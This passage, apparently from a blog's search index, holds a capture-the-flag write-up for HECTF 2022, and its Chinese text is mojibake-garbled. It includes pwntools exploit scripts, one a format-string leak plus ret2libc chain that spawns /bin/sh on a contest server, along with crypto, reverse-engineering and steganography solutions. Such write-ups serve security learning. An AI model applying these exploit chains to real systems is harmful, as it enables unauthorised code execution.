bytes.fromhex(&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;) # 128bitå¯†é’¥sm4 = SM4Cipher(key)# åŠ¨è°ƒæµ‹è¯•åŠ å¯†# plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;) # 128bitæ˜æ–‡# print(sm4.encrypt(plaintext).hex())# è§£å¯†c = bytes.fromhex(&quot;D75CDA22176DD392A1A570915F66A61C&quot;)print(sm4.decrypt(c).hex())# 6f2069d8ab245446d789590d2cfe20d6 â€‹ authorâ€™sB0x still ez è¯†åˆ«ä»£ç é€»è¾‘ä¸ºRC4ç®—æ³•ï¼Œkeyä¸º thiskeyï¼Œæå–å¯†æ–‡hexä¸º C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946ï¼Œ Cyberchefè§£å‡ºflagï¼šHECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125; â€‹ runåˆ†æä»£ç é€»è¾‘ï¼Œä¸º8å±‚8*8è¿·å®«ï¼Œå…¶ä¸­0ä¸ºå¯èµ°æ–¹å—ï¼Œ1ä¸ºä¸å¯èµ°æ–¹å—ï¼Œwsadä¸ºä¸Šä¸‹å·¦å³ï¼Œuä¸ºä¸‹ä¸€å±‚ï¼Œnä¸ºä¸Šä¸€å±‚ã€‚ å°†8å±‚01è¿·å®«çŸ©é˜µæ‰“å°å‡ºæ¥ï¼Œä»ç¬¬ä¸€å±‚ (0,0) æ‰‹åŠ¨æ¨¡æ‹Ÿèµ°è¿·å®«ï¼Œå¾—åˆ°è·¯å¾„ ssddssuuwwddndduuussdussasauuddï¼ŒåŠ ä¸ŠHECTF{}å³ä¸ºflagã€‚ â€‹ è¿˜åŸmd5 MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613 å“ˆå“ˆå“ˆï¼Œé€†å»å§ HINTS: æ³¨æ„ï¼Œreé¢˜ç›®md5çš„flagæäº¤æ—¶ä¸éœ€è¦å†å¥—HECTF{} txtå†…å®¹åƒæ˜¯è°ƒç”¨libsfdata.soè®¡ç®—md5è¿‡ç¨‹æ±‡ç¼–æ“ä½œè®°å½•ï¼Œæ—¢ç„¶æ˜¯å…¨è¿‡ç¨‹ï¼Œè‚¯å®šæœ‰è¯»å…¥åŸå§‹æ•°æ®ï¼Œä»¥16è¿›åˆ¶å­˜å…¥å¯„å­˜å™¨æˆ–å†…å­˜çš„ç—•è¿¹ï¼ŒHECTçš„hexå€¼â€48454354â€œï¼Œæ³¨æ„æ˜¯å°ç«¯åºï¼Œå…¨å±€æœç´¢ 54434548ï¼Œæ‰¾åˆ° r6=0x54434548 ç–‘ä¼¼è¯»å…¥å¯„å­˜å™¨æ“ä½œï¼Œç»§ç»­å…¨å±€æœç´¢ =&gt; r6=0xï¼Œæœ‰ 123456789101112Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6eLine 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58 ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576 æå–å‡ºr6çš„å€¼hexè½¬å­—ç¬¦å³ä¸ºflagï¼šHECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw â€‹ Pwnç­¾åˆ°å…ˆåˆ©ç”¨ \\x00 æˆªæ–­ç»•è¿‡ strcmp æ¯”è¾ƒï¼Œè¿›å…¥ system(&#39;vim -R&#39;) çš„vimäº¤äº’æ¨¡å¼ï¼Œå†ä½¿ç”¨vimå‘½ä»¤ :e æ–‡ä»¶å è¯»å–flagå†…å®¹ã€‚ 12345678910111213141516from pwn import *context.log_level=&#x27;debug&#x27;r = remote(&#x27;121.4.111.50&#x27;,32365)r.recvline()r.recvline()r.send(b&#x27;\\x00&#x27;)r.recvline()r.recvline()r.recvline()r.send(b&#x27;x&#x27;)r.sendline(b&#x27;:e flag&#x27;)r.interactive() å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¿›å…¥vimå‘½ä»¤ä¼šæ¸…ç©ºç»ˆç«¯å†…å®¹ï¼Œåœ¨pwntoolsäº¤äº’ä¸‹è¯»å–çš„å†…å®¹ä¼šè¢«ç¬é—´åˆ·æ‰ï¼Œå¯ä»¥å°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼Œè·å–åˆ°flagå†…å®¹è¾“å‡ºï¼š python test.py &gt; output.txt â€‹ çœŸÂ·ç­¾åˆ° å¬è¯´ä½ è¿˜æ²¡ç­¾ä¸Šåˆ° intç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºcharï¼Œå½“å€¼ä¸º128~255æ—¶å˜æˆè´Ÿæ•°ï¼Œæ¨¡æ‹Ÿä¼ªä»£ç ï¼Œåœ¨æœ€å¤§å€¼2147483647é™„è¿‘å°è¯•å¯»æ‰¾æ‰€éœ€æ•°å­—ï¼š 12345678910111213#include &lt;stdio.h&gt;int main()&#123; unsigned int x = 2147483646-124; printf(&quot;%d\\n&quot;, x); int y = x; printf(&quot;%d\\n&quot;, (char)y); printf(&quot;%d\\n&quot;, (char)y&lt;-125); printf(&quot;%d\\n&quot;, y&gt;255); return 0;&#125; 2147483522æ»¡è¶³æ¡ä»¶ï¼Œä¼ å…¥ågetshellæ‹¿åˆ°flagã€‚ â€‹ fmtç¨‹åºå¼€äº†PIEï¼ŒgdbåŠ¨è°ƒï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å½“å‰å‡½æ•°åœ°å€ï¼Œå†å‡å»åç§»å¾—åˆ°ç¨‹åºåŸºå€ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ç®€å•ret2libcå³å¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435from pwn import *r = remote(&#x27;121.4.102.43&#x27;,31550)elf = ELF(&#x27;./fmt&#x27;)libc = ELF(&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;)#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)r.recvline()r.send(b&#x27;%15$p&#x27;)pie_base = eval(r.recv(14))-0x123aprint(hex(pie_base))pop_rdi = pie_base+0x1333pop_rsi_r15 = pie_base+0x1331ret = pie_base+0x101aputs_got = pie_base+elf.got.putsputs_plt = pie_base+elf.plt.putsget = pie_base+0x12abpl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)r.sendline(pl)puts_addr = u64(r.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr-libc.sym.putsprint(hex(libc_base))system = libc_base+libc.sym.systembinsh = libc_base+libc.search(b&#x27;/bin/sh\\x00&#x27;).__next__()pl = b&#x27;a&#x27;*(0x10+8)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)+p64(get)print(len(pl))r.sendline(pl)r.interactive() â€‹ CryptoæµåŠ¨çš„éŸ³ç¬¦txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨åœ¨çº¿è§£å¯†å·¥å…·è§£å¯†å¾—åˆ°flagã€‚ â€‹ matrixå‡ºé¢˜å¤±è¯¯ï¼Œæºç æ³„éœ²æ‹¿åˆ°flagã€‚ â€‹ ezrsa 123456789101112131415161718192021from Crypto.Util.number import *from secret import flagflag = b&#x27;xxx&#x27;e = 114m = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)t = getPrime(1024)n = p * q * tp_=pow(p,2,n)q_=pow(q,2,n)c = pow(m,e,n)print(&#x27;p_=&#x27;,p_)print(&#x27;q_=&#x27;,q_)print(&#x27;c=&#x27;,c)print(&#x27;n=&#x27;,n)#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 å›  $p^2&lt;n,q^2&lt;n$ï¼Œå¯ç›´æ¥å¼€æ”¾æ±‚å¾— $p,q$ åŠ $r$ã€‚ åˆ $\\gcd(e,\\varphi)=6$ï¼Œåˆ©ç”¨ $\\gcd(\\cfrac{e}{6},\\varphi)=1$ å…ˆå¸¸è§„RSAè®¡ç®—å‡º $m^6$ å†å¼€æ–¹å³å¯ã€‚ 12345678910111213141516p_ = q_ = c = n = import gmpy2p = gmpy2.iroot(p_,2)[0]q = gmpy2.iroot(q_,2)[0]r = n//(p*q)f = (p-1)*(q-1)*(r-1)e = 114d = inverse_mod(e//6,f)mm = pow(c,d,n)m = gmpy2.iroot(mm,6)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27; â€‹ rsa2 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import sympyimport randomimport mathfrom secret import flag, hint, e1def mygenerate(): while True: p = getPrime(512) if p % 8 == 5: break g = p-random.randint(1 &lt;&lt; 13, 1 &lt;&lt; 15) q = sympy.nextprime(math.gamma(g+1) % p) return p, g, qp, g, q = mygenerate()n = p*qe2 = 65537m1 = bytes_to_long(flag)m2 = bytes_to_long(hint)c1 = pow(m1, e1, p)c2 = pow(m2, e2, n)print(&#x27;p =&#x27;+str(p))print(&#x27;g =&#x27;+str(g))print(&#x27;c1 =&#x27;+str(c1))print(&#x27;c2 =&#x27;+str(c2))&#x27;&#x27;&#x27;p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627&#x27;&#x27;&#x27; ç´ å› å­çš„ç”Ÿæˆå‡½æ•°ä¸­ï¼Œ $q=\\text{nextprime}(\\Gamma(g+1) \\bmod p)=\\text{nextprime}(g! \\bmod p)=\\text{nextprime}((p-r)! \\bmod p)$ ç»“åˆå¨å°”é€Šå®šç† $(p-2)! \\equiv 1 \\pmod p$ï¼Œæœ‰ $q = \\text{nextprime}(\\prod\\limits_{k=2}^{r-1}(p-k)^{-1} \\bmod p)$ æ±‚å‡º $p,q$ ï¼ŒRSAè§£å¯†å¾—hintï¼š$e_1=2$ï¼Œå†è§£å¯†å¾— $m$ã€‚ 1234567891011121314151617181920212223242526272829import sympyimport mathp =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627r = p-gq = 1for k in range(2,r): q = q*inverse_mod(p-k,p)%pq = sympy.nextprime(q)n = p*qe2 = 65537f = (p-1)*(q-1)d2 = inverse_mod(e2,f)m2 = pow(c2,d2,n)hint = bytes.fromhex(hex(m2)[2:])print(hint)# b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;e1 = 2P.&lt;x&gt; = PolynomialRing(Zmod(p))f = x ^ e1 - c1x = f.monic().roots()[1][0]flag= bytes.fromhex(hex(x)[2:])print(flag)# b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27; â€‹ onebit 123456789101112131415161718192021222324252627282930313233import randomfrom Crypto.Util.number import *from secret import flagdef Le(n, p): return pow(n, (p - 1) // 2, p)def Encrypt(message, n, g): ciphertext = [] for i, m in enumerate(message): k = random.randint(1, 2**512) c = ((g**int(m)) * (k ** 2)) % n ciphertext.append(c) return ciphertextp = getPrime(512)q = getPrime(512)while True: g = getPrime(512) if Le(g, p) == p-1 and Le(g, q) == q-1: breakm = bytes_to_long(flag)m = str(bin(m))[2:]n = p*qc = Encrypt(m, n, g)f = open(&#x27;output.txt&#x27;, &#x27;w&#x27;)f.write(str(p)+&#x27;\\n&#x27;)f.write(str(g)+&#x27;\\n&#x27;)f.write(str(c))f.close() åŠ å¯†ç»“æœ $c=g^mk^2$ï¼Œç¬¦åˆGMåŒæ€åŠ å¯†ç³»ç»Ÿï¼Œåˆ†åˆ«åˆ¤æ–­ $c_i$ æ˜¯å¦ä¸ºåŸºäºæ¨¡ $p$ çš„äºŒæ¬¡å‰©ä½™å³å¯ï¼š 12345678910111213141516from Crypto.Util.number import long_to_bytesimport gmpy2p = 10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517g = 8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089c = plaintext = &#x27;&#x27;for k in c: cipher = int(k) if gmpy2.jacobi(cipher,p) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27;print(long_to_bytes(int(plaintext,2)))# b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27; â€‹ mixture 12345678910111213p=235322474717419a=0b=8856682k=E = EllipticCurve(GF(p), [a, b])P = E.random_point()P.order()==pQ=k*Paes_key=kprint(&quot;P:&quot;,P)print(&quot;Q:&quot;,Q)#P=E(180571547161769,227820272156445)#Q=E(76765539897460,69715189045993) 1234567891011121314151617181920212223from Crypto.Cipher import AESimport base64aes_key = b&#x27;???&#x27;def pad(text): while len(text) % 16 != 0: text += b&#x27; &#x27; return textdef pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)plain_text = b&#x27;???&#x27;enc_text = aes.encrypt(pad(plain_text))enc_text_b64=base64.b64encode(enc_text)print(enc_text_b64)#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8= ECC+AESã€‚ ECCæ»¡è¶³ $P.\\text{order}()=p$ï¼Œåˆ©ç”¨Smartâ€™s Attackè§£ $k$ï¼š 123456789101112131415161718192021222324252627282930313233343536p = 235322474717419a = 0b = 8856682E = EllipticCurve(GF(p), [a, b])P = E(180571547161769,227820272156445)Q = E(76765539897460,69715189045993)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)k = SmartAttack(P, Q, p)print(k)# 152675955744921 å†ä»£å…¥è¿˜åŸAESè§£å¯†å³å¯ï¼š 123456789101112131415161718from Crypto.Cipher import AESimport base64aes_key = b&#x27;152675955744921&#x27;def pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)enc_text_b64 = &#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;enc_text = base64.b64decode(enc_text_b64)plain_text = aes.decrypt(enc_text)print(plain_text)# b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27; â€‹ xyzç”±äºç´ æ•° $x \\in (2^{11},2^{12})$ï¼Œçˆ†ç ´ $x$ ï¼Œå†è§£å…³äº $y,z$ çš„äºŒå…ƒä¸€æ¬¡æ¨¡æ–¹ç¨‹ç»„ï¼Œæ ¹æ®å¼2å°† $z$ ä»£å…¥å¼1ï¼Œå¾—åˆ°å…³äº $y$ çš„æ¨¡æ–¹ç¨‹ï¼Œçˆ†ç ´æ±‚è§£ $m_1,m_2$ï¼Œç›´åˆ°å¾—åˆ°æ»¡è¶³flagæ ¼å¼çš„å€¼å³è§£ã€‚ 12345678910111213141516171819202122232425262728293031323334# Sageimport gmpy2p = 90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791a = 76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579b = 29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319s = []for i in range(10000): if i.bit_length()==12 and gmpy2.is_prime(i): s.append(i)print(len(s))ey = []for x in s: print(x) P.&lt;y&gt; = PolynomialRing(Zmod(p)) z = (b - x^12 - y^12)*inverse_mod(120*x,p) g = (12 * x + 12 * y + y * z + x * z ** 12) - a roots = g.monic().roots() if len(roots)&gt;0: for k in roots: ee = x yy = k[0] zz = (b - x^12 - yy^12)*inverse_mod(120*x,p)%p d = inverse_mod(ee, p-1) m1 = pow(yy, d, p) m2 = pow(zz, d, p) if &#x27;48454354467b&#x27; in hex(m1)[2:]: print(x) print(bytes.fromhex(hex(m1)[2:]+hex(m2)[2:])) break # 3989# HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125; â€‹ Miscå’¦~å°é²¨é±¼æ¥å–½wiresharkæ‰“å¼€æµé‡æ–‡ä»¶ï¼Œé€ä¸ªæµæŸ¥çœ‹ï¼Œä¸€çœ¼æ‰¾åˆ°flagã€‚ â€‹ æ¥ç©æ‰è¿·è—å‘€ ä½ èƒ½å¯»æ‰¾åˆ°çœŸæ­£çš„æˆ‘å—ï¼Ÿ pngå›¾ç‰‡æœ‰lsbéšå†™ï¼Œzstegæå–å‡ºå†…å®¹ï¼š zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txtï¼Œ å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸²è½¬stringï¼Œå†xor 0x33å‘ç°zipå‹ç¼©åŒ…å¤´ï¼Œæå–å‡ºzipå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°flag.docï¼Œå°†æ–‡å­—å…¨é€‰è®¾ç½®é¢œè‰²ï¼Œå‘ç°flagï¼šHECTF&#123;hah0ha_Find-Me!!!&#125;ã€‚ â€‹ ä½ æŠŠæˆ‘flagè—å“ªå»äº†?flag.docxä¸­æ‰“å¼€éšè—æ–‡å­—ï¼Œå¾—åˆ°çš„base64è§£ç å¾—ç¬¬ä¸€æ®µå­—ç¬¦ä¸²ï¼š kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky otherflag.txtä¸­å«æœ‰é›¶å®½å­—ç¬¦ï¼Œåˆ©ç”¨åœ¨çº¿ç½‘ç«™æå–å‡ºç¬¬äºŒæ®µå­—ç¬¦ä¸²ï¼š flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla çœ‹å­—ç¬¦ä¸²æ— è§„å¾‹ï¼ŒçŒœæµ‹ä¸ºå­—ç¬¦é¢‘ç‡ç»Ÿè®¡ï¼Œæ‰¾ä¸€ä¸ªåœ¨çº¿å·¥å…·ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•°ï¼ŒæŒ‰ç»“æœä»å¤§åˆ°å°æ’åºå–å‡ºå¯¹åº”å­—ç¬¦ä¸º flagkpomijnhuybrvdxezswq&#123;&#125;ï¼Œè°ƒæ•´æ‹¬å·ä½ç½®å³ä¸ºflagï¼šflag&#123;kpomijnhuybrvdxezswq&#125;ã€‚ â€‹ æˆ‘çš„æ‰‹è¦ä¸è¡Œè¾£å›¾ç‰‡å†…æ–‡å­—ç”¨åœ¨çº¿OCRè¯†åˆ«è½¬æ–‡å­—ï¼Œhexè½¬å­—ç¬¦ï¼Œæ ¹æ®æ–‡ä»¶å¤´è½¬å­˜ä¸ºzipå‹ç¼©åŒ…ï¼Œä½¿ç”¨ARCHPRçˆ†ç ´å‡ºå¯†ç 8686ï¼Œè§£å‹å¾—åˆ°txtå†…ä¸ºéŸ³ç¬¦åŠ å¯†ï¼Œä½¿ç”¨åœ¨çº¿è§£å¯†å·¥å…·è§£å¯†å¾—åˆ°flagï¼šflag&#123;y0u_fi0d_m2_f1ag&#125;ã€‚ â€‹ 2022HECTFè°ƒæŸ¥é—®å·å†™é—®å·å¾—flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","slug":"match-2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›","date":"2022-09-04T05:46:20.000Z","updated":"2022-09-04T13:50:35.327Z","comments":true,"path":"2022/09/04/match-2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›/","permalink":"https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ 